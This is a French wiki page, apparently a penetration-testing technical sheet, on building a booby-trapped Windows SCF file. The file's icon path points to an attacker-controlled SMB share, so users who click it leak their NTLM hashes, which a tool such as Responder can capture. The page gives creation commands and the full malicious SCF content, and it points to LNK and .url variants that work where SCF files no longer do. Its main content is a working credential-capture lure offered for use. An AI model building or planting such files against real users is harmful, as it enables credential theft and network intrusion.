---
title: Créer un fichier SCF piégé
description: Guide pour la création de fichier SCF (Shell Command File) piégé. Un fichier SCF peut être utilisé par un attaquant pour récupérer les hash des utilisateurs.
published: true
date: 2025-05-04T14:53:28.758Z
tags: windows, fiche technique
editor: markdown
dateCreated: 2024-10-26T09:31:10.018Z
---

# Introduction

Guide pour la création de fichier SCF (Shell Command File) piégé. Un fichier SCF peut être utilisé par un attaquant pour récupérer les hash des utilisateurs.

> Un fichier SCF est utilisé par l'explorateur de fichier pour effectuer de nombreuses actions comme afficher le bureau ou encore se déplacer dans l'arborescence.
> {.is-info}

La base de l'exploitation repose sur le fait de définir l'icone du fichier SCF vers le serveur d'un attaquant. En cliquant sur le raccourci, l'utilisateur va essayer de s'authentifier au serveur pour récupèrer cette icône.

> Depuis Windows Server 2019, les fichiers SCF ne fonctionnent plus. Mais il est possible de passer par des fichiers .lnk malveillants pour contourner le problème.
> {.is-warning}

# Création du fichier

Créer un fichier se terminant par .scf
`New-Item monfichier.scf`
Modifier le fichier
`notepad.exe monfichier.scf`
Ajouter les lignes suivantes et changer certains champs comme souhaité:

```
[Shell]
Command=2
IconFile=\\<adresse du serveur attaquant>\<nom du partage>\<nom de l'icône>.ico
[Taskbar]
Command=ToggleDesktop
```

> Le fichier ainsi que le partage n'existent pas obligatoirement sur le serveur attaquant, il est possible d'avoir uniquement un outil comme Responder pour intercepter les hash.
> {.is-info}

A présent, le fichier est maintenant créer, il suffit d'attendre que le fichier soit cliqué pour recevoir les informations d'authentification sur notre machine attaquante.

# Voir aussi

Fiche technique pour la création d'un fichier LNK piégé
[voir la page](/Fiches-techniques/Windows/Creer-un-fichier-LNK-piégé)

Lnkbomb, créer des fichiers raccourcis .url malveillants
[voir la page](/Outils/Indépendant/Lnkbomb)
